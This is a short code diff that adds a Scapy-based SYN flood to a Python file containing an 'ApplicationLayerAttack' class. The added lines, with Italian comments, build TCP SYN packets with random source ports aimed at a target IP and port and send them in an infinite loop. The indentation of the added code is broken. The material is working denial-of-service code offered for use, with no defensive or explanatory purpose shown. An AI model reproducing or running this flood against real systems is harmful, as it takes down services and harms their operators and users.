@@ -152,3 +152,18 @@ class ApplicationLayerAttack:
     @staticmethod
     def get(vector: list, bye: bytes):
         print(f"GET attack on {vector} with {len(bye)} bytes")
+
+
+
+
+
+ip = IP(dst=target_ip)
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+
+    # Combina gli strati
+    pkt = ip/tcp
+
+    print(f"Iniziando SYN flood su {target_ip}:{target_port}")
+
+    # Invia pacchetti in loop infinito
+    send(pkt, loop=1, verbose=0)
